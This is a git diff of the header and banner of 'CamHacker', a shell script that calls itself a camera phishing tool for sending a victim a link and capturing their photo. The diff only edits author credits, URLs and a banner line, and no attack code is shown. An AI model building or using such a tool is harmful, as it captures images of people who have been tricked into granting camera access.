@@ -3,9 +3,8 @@
 # CamHacker
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra, SUMAN, jasim 0021
-# Github     : https://github.com/jasim0021/
-# Email      : info@jasim0021.in
+# Author     : KasRoudra, SUMAN, 
+# Github     : https://github.com/jasim0021
 # Credits    : CamHacker, Suman, Noob-Hackers, TechChipNet, LinuxChoice, 
 # Date       : 21-04-2022
 # Language   : Shell, HTML, Css
@@ -38,7 +37,7 @@ echo -e "
 █▄█ █▀█ ▄█ █ █░▀░█ █▄█ █▄█ █▄ ░█echo "    
   echo -e $'\e[1;33m\e[0m\e[1;31m    ██████████\e[0m'"\e[1;37m██████████"'\e[1;33m\e[0m\e[0;32m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m Camera 0021 \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
   echo ""
-   echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Follow Github : \e[36mhttps://github.com/jasim0021/CameraHack\e[0m \e[1;32m\e[0m\e[1;33m]\e[0m'
+   echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Follow Github : \e[36mhttps://github.com/jasim0021/CamHacker/e[0m \e[1;32m\e[0m\e[1;33m]\e[0m'
    echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
       echo -e "\e[93m    |J|A|S|I|M| |0|0|2|1|"      
